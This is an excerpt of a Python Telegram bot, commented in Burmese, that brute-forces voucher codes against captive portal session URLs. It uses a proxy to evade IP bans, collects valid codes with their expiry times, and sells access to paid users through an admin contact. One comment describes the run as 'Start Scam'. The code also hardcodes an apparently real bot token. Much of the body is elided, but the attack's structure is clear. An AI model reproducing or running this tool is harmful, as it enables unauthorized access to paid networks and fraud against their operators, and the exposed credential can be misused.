...
BOT_TOKEN = "8980601502:AAFohlUv1IAQtk9iC6XJJy7EOB4UXTPBKIw"
...
async def recheck_command(message):
    ...
    if not approve.get(chat_id, False) and str(chat_id) not in paid_users:
        await bot.reply_to(message, "⚠️ သင့်တွင် PAID USER မဟုတ်ပါ။ PAID USER ဝယ်ယူရန် Admin @kuranomi10 သို့ ဆက်သွယ်ပါ။")
        return
...
async def handle_portal(message):
    ...
    # Portal စစ်တဲ့နေရာမှာ IP Ban ကျော်ဖို့ Proxy ကို အမြဲသုံးပါမယ်
    if await check_session_url(session_url=url, use_proxy=True):
        user_data[message.chat.id]['session_url'] = url
        
        # Admin ထံသို့ Portal URL Notification ပို့ခြင်းကို ဤနေရာမှ ပိတ်ထားပြီး Start Scam နှိပ်မှသာ ပို့ပါမည်။
...
# Portal URL စစ်တဲ့နေရာမှာပဲ Proxy သုံးမယ်
...
async def stop_scan_command(message):
    ...
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        # ဖိုင်ပို့ပေးရန် (သတ်မှတ်ထားသော ID များအတွက်)
...
async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
    ...
    try:
        ...
        # ပြီးဆုံးချိန်မှာလည်း ဖိုင်ပို့ရန် (မပို့ရသေးရင်)
        await send_success_file(chat_id)
...
# Proxy မသုံးတော့ဘူး - Portal URL စစ်တဲ့နေရာမှာပဲ သုံးမယ်
...
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    ...
    if 'logonUrl' in response:
        ...
        # အချိန်အားလုံးကို ပြပေးရန် filter ကို ဖယ်ရှားလိုက်ပါသည်
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        # Telegram message length limit (4096 characters) ကို ထည့်သွင်းစဉ်းစား၍
        # Message တစ်စောင် ပြည့်သွားပါက နောက်ထပ် message အသစ်ဖြင့် ဆက်ပြပေးပါမည် (Code အဟောင်းများ မဖယ်ပါ)
        if chat_id not in user_data:
            user_data[chat_id] = {}
        
        # လက်ရှိ message ထဲမှာ ပြမယ့် code စာရင်း
        ...
        if message:
            try:
                if chat_id not in success_messages or len(code_line) > 4000:
                    # Message အသစ်စပို့ခြင်း (သို့မဟုတ်) စာလုံးရေပြည့်သွား၍ အသစ်ပြန်ပို့ခြင်း
                    ...
                    # ရှိပြီးသား message ကို update လုပ်ခြင်း
                    try:
...
def should_show_code(total_minutes):
    """
    Time 0m ဖြစ်တဲ့ code တွေကိုရော၊ 1 day (1440m) ထက်ကျော်တဲ့ code တွေကိုရော ပြပေးရန်။
    """
    if total_minutes == 'Unknown':
        return True
    try:
...
async def Code_Expires_Date(active_id):
    """Try multiple balance API paths as suggested in time5.py"""
    paths = [
